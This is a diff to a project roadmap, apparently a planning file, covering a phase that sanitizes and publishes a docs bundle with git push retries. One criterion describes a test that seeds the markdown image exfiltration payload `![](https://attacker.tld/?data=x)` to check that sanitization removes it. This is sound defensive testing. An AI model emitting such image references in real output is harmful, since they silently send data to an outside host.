@@ -141,8 +141,8 @@
   4. Every staged file is sanitized to strip external image references, raw HTML, and HTML comments before commit, and a test seeding `![](https://attacker.tld/?data=x)` confirms the reference is removed
   5. Push uses `git push` over HTTPS (never `--force`) with 3-attempt jittered retry on non-fast-forward, and a test that races two concurrent publishes produces two commits on `main` with no lost updates
 **Plans**: 3 plans
-  - [x] 24-01-PLAN.md — Wave 0: tests/test-phase24.sh + fixtures + canonical bundle.md template (RPT-01 file half)
-  - [ ] 24-02-PLAN.md — Wave 1: verify_bundle_sections + sanitize_markdown_file helpers (RPT-01, RPT-04)
+  - [ ] 24-01-PLAN.md — Wave 0: tests/test-phase24.sh + fixtures + canonical bundle.md template (RPT-01 file half)
+  - [x] 24-02-PLAN.md — Wave 1: verify_bundle_sections + sanitize_markdown_file helpers (RPT-01, RPT-04)
   - [ ] 24-03-PLAN.md — Wave 2: publish_docs_bundle main function — composes redact + sanitize + atomic commit + push_with_retry (DOCS-02, DOCS-03, RPT-02, RPT-03, RPT-05)
 
 ### Phase 25: Context Read & Read-Only Bind Mount
